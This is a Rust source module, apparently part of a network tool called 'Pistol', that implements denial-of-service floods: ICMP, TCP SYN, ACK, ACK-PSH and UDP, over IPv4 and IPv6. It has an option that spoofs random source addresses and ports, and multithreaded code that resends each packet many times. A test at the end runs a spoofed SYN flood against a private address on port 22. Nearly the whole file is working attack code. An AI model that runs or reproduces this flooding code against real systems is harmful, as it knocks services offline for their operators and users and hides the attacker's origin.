use chrono::DateTime;
use chrono::Local;
use pnet::datalink::MacAddr;
use pnet::packet::ethernet::EtherTypes;
use prettytable::Cell;
use prettytable::Row;
use prettytable::Table;
use prettytable::row;
use std::collections::BTreeMap;
use std::fmt;
use std::net::IpAddr;
use std::net::Ipv4Addr;
use std::net::Ipv6Addr;
use std::sync::mpsc::channel;
use std::thread;
use std::time::Duration;
use std::time::Instant;
use tracing::error;

pub mod icmp;
pub mod icmpv6;
pub mod tcp;
pub mod tcp6;
pub mod udp;
pub mod udp6;

use crate::FloodTargetWithNetInfo;
use crate::PistolStream;
use crate::SendPacketParam;
use crate::error::PistolError;
use crate::utils::random_ipv4_addr;
use crate::utils::random_ipv6_addr;
use crate::utils::random_port;
use crate::utils::time_to_string;

#[derive(Debug, Clone)]
pub struct FloodReport {
    pub addr: IpAddr,
    pub send_packet: usize, // count
    pub send_size: usize,   // KB, MB or GB
    pub cost: Duration,
}

#[derive(Debug, Clone)]
pub struct Floods {
    pub layer2_cost: Duration,
    pub flood_reports: Vec<FloodReport>,
    pub start_time: DateTime<Local>,
    pub finish_time: DateTime<Local>,
}

impl fmt::Display for Floods {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        const BYTES_PER_MB: u64 = 1024;
        const BYTES_PER_GB: u64 = 1024 * 1024;
        let mut table = Table::new();
        table.add_row(Row::new(vec![
            Cell::new("Flood Attack").style_spec("c").with_hspan(3),
        ]));
        table.add_row(row![c -> "id", c -> "addr", c -> "report"]);

        // sorted
        let mut btm_addr: BTreeMap<IpAddr, FloodReport> = BTreeMap::new();
        for report in &self.flood_reports {
            btm_addr.insert(report.addr, report.clone());
        }

        let mut i = 1;
        for (addr, report) in btm_addr {
            let time_cost = report.cost;
            let time_cost_str = time_to_string(time_cost);
            let time_cost = time_cost.as_secs_f64();
            let (size_str, traffic_str) = if report.send_size as f64 / BYTES_PER_GB as f64 > 1.0 {
                let v = report.send_size as f64 / BYTES_PER_GB as f64;
                let k = v / time_cost;
                (format!("{:.2}GB", v), format!("{:.2}GB/s", k))
            } else if report.send_size as f64 / BYTES_PER_MB as f64 > 1.0 {
                let v = report.send_size as f64 / BYTES_PER_MB as f64;
                let k = v / time_cost;
                (format!("{:.2}MB", v), format!("{:.2}MB/s", k))
            } else {
                let v = report.send_size;
                let k = v as f64 / time_cost;
                (format!("{}Bytes", v), format!("{:.2}B/s", k))
            };
            let traffic_str = format!(
                "packets sent: {}({}), time cost: {}({})",
                report.send_packet, size_str, time_cost_str, traffic_str
            );

            let addr_str = format!("{}", addr);
            table.add_row(row![c -> i, c -> addr_str, c -> traffic_str]);
            i += 1;
        }

        let summary = format!(
            "start at: {}, finish at: {}",
            self.start_time.format("%Y-%m-%d %H:%M:%S"),
            self.finish_time.format("%Y-%m-%d %H:%M:%S"),
        );
        table.add_row(Row::new(vec![Cell::new(&summary).with_hspan(3)]));
        write!(f, "{}", table.to_string())
    }
}

impl Floods {
    pub(crate) fn new() -> Floods {
        Floods {
            layer2_cost: Duration::ZERO,
            flood_reports: Vec::new(),
            start_time: Local::now(),
            finish_time: Local::now(),
        }
    }
    pub(crate) fn finish(&mut self, flood_reports: Vec<FloodReport>) {
        self.finish_time = Local::now();
        self.flood_reports = flood_reports;
    }
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    AckPsh,
    Udp,
}

fn ipv4_flood_thread(
    dst_mac: MacAddr,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    src_mac: MacAddr,
    src_ipv4: Ipv4Addr,
    src_port: u16,
    if_name: String,
    method: FloodMethods,
    retransmit: usize,
) -> Result<usize, PistolError> {
    let mut stream = PistolStream::new();
    stream.init_without_receiver()?;

    let buff = match method {
        FloodMethods::Icmp => icmp::build_icmp_flood_packet(dst_ipv4, src_ipv4)?,
        FloodMethods::Syn => tcp::build_syn_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?,
        FloodMethods::Ack => tcp::build_ack_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?,
        FloodMethods::AckPsh => {
            tcp::build_ack_psh_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
        }
        FloodMethods::Udp => udp::build_udp_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?,
    };

    let spp = SendPacketParam {
        dst_mac,
        src_mac,
        eth_type: EtherTypes::Ipv4,
        l3_payload: buff.clone(),
        if_name: if_name,
        retransmit,
    };

    stream.send_packet(spp)?;

    let send_buff_size = buff.len() * retransmit;
    Ok(send_buff_size)
}

fn ipv6_flood_thread(
    dst_mac: MacAddr,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    src_mac: MacAddr,
    src_ipv6: Ipv6Addr,
    src_port: u16,
    if_name: String,
    method: FloodMethods,
    retransmit: usize,
) -> Result<usize, PistolError> {
    let mut stream = PistolStream::new();
    stream.init_without_receiver()?;

    let buff = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(dst_ipv6, src_ipv6)?,
        FloodMethods::Syn => tcp6::build_syn_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?,
        FloodMethods::Ack => tcp6::build_ack_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?,
        FloodMethods::AckPsh => {
            tcp6::build_ack_psh_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
        }
        FloodMethods::Udp => udp6::send_udp_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?,
    };

    let spp = SendPacketParam {
        dst_mac,
        src_mac,
        eth_type: EtherTypes::Ipv6,
        l3_payload: buff.clone(),
        if_name: if_name,
        retransmit,
    };

    stream.send_packet(spp)?;

    let send_buff_size = buff.len() * retransmit;
    Ok(send_buff_size)
}

fn flood(
    flood_targets: Vec<FloodTargetWithNetInfo>,
    method: FloodMethods,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    let mut pistol_floods = Floods::new();
    let (tx, rx) = channel();

    let mut recv_size = 0;
    for ft in flood_targets {
        let ni = ft.net_info;
        match ni.inferred_dst_addr {
            IpAddr::V4(dst_ipv4) => {
                for _ in 0..repeat {
                    let dst_port = match ft.dst_port {
                        Some(port) => port,
                        None => 80, // default port for flood attack
                    };

                    let dst_mac = ni.inferred_dst_mac;
                    let src_mac = ni.inferred_src_mac;
                    let src_ipv4 = match fake_src {
                        true => random_ipv4_addr(),
                        false => match ni.inferred_src_addr {
                            IpAddr::V4(src_ipv4) => src_ipv4,
                            _ => random_ipv4_addr(),
                        },
                    };
                    let src_port = match fake_src {
                        true => random_port(),
                        false => match ft.src_port {
                            Some(port) => port,
                            None => random_port(),
                        },
                    };
                    let dst_addr = ni.inferred_dst_addr;

                    let tx = tx.clone();
                    let if_name = ni.inferred_interface.name.clone();
                    thread::spawn(move || {
                        let start_time = Instant::now();
                        let ret = ipv4_flood_thread(
                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, if_name,
                            method, retransmit,
                        );
                        if let Err(e) = tx.send((dst_addr, ret, start_time)) {
                            error!("failed to send to tx on func flood: {}", e);
                        }
                    });
                    recv_size += 1;
                }
            }
            IpAddr::V6(dst_ipv6) => {
                for _ in 0..repeat {
                    let dst_port = match ft.dst_port {
                        Some(port) => port,
                        None => 80, // default port for flood attack
                    };

                    let dst_mac = ni.inferred_dst_mac;
                    let src_mac = ni.inferred_src_mac;
                    let src_ipv6 = match fake_src {
                        true => random_ipv6_addr(),
                        false => match ni.inferred_src_addr {
                            IpAddr::V6(src_ipv6) => src_ipv6,
                            _ => random_ipv6_addr(),
                        },
                    };
                    let src_port = match fake_src {
                        true => random_port(),
                        false => match ft.src_port {
                            Some(port) => port,
                            None => random_port(),
                        },
                    };
                    let dst_addr = ni.inferred_dst_addr;

                    let tx = tx.clone();
                    let if_name = ni.inferred_interface.name.clone();
                    thread::spawn(move || {
                        let start_time = Instant::now();
                        let ret = ipv6_flood_thread(
                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, if_name,
                            method, retransmit,
                        );
                        if let Err(e) = tx.send((dst_addr, ret, start_time)) {
                            error!("failed to send to tx on func flood: {}", e);
                        }
                    });
                    recv_size += 1;
                }
            }
        }
    }

    let iter = rx.into_iter().take(recv_size);
    let mut flood_reports = Vec::new();
    for (dst_addr, ret, start_time) in iter {
        let time_cost = start_time.elapsed();
        match ret {
            Ok(send_size) => {
                let flood_report = FloodReport {
                    addr: dst_addr,
                    send_packet: retransmit * repeat,
                    send_size,
                    cost: time_cost,
                };
                flood_reports.push(flood_report);
            }
            Err(e) => return Err(e),
        }
    }
    pistol_floods.finish(flood_reports);
    Ok(pistol_floods)
}

pub(crate) fn icmp_flood(
    flood_targets: Vec<FloodTargetWithNetInfo>,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        flood_targets,
        FloodMethods::Icmp,
        retransmit,
        repeat,
        fake_src,
    )
}

pub(crate) fn tcp_syn_flood(
    flood_targets: Vec<FloodTargetWithNetInfo>,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        flood_targets,
        FloodMethods::Syn,
        retransmit,
        repeat,
        fake_src,
    )
}

pub(crate) fn tcp_ack_flood(
    flood_targets: Vec<FloodTargetWithNetInfo>,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        flood_targets,
        FloodMethods::Ack,
        retransmit,
        repeat,
        fake_src,
    )
}

pub(crate) fn tcp_ack_psh_flood(
    flood_targets: Vec<FloodTargetWithNetInfo>,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        flood_targets,
        FloodMethods::AckPsh,
        retransmit,
        repeat,
        fake_src,
    )
}

pub(crate) fn udp_flood(
    flood_targets: Vec<FloodTargetWithNetInfo>,
    retransmit: usize,
    repeat: usize,
    fake_src: bool,
) -> Result<Floods, PistolError> {
    flood(
        flood_targets,
        FloodMethods::Udp,
        retransmit,
        repeat,
        fake_src,
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Pistol;
    use crate::XxpFloodTarget;
    #[test]
    fn test_flood() {
        let dst_addr = Ipv4Addr::new(192, 168, 5, 5);
        let dst_port = 22;
        let target1 = XxpFloodTarget::new(dst_addr.into(), Some(dst_port), None, None);
        let targets = vec![target1];
        let retransmit = 480; // The number of times to repeat sending the same attack packet.
        let repeat = 4; // The number of times each thread repeats the attack.

        let mut pistol = Pistol::new();

        let ret = pistol
            .tcp_syn_flood(&targets, retransmit, repeat, true)
            .unwrap();
        println!("{}", ret);
    }
}
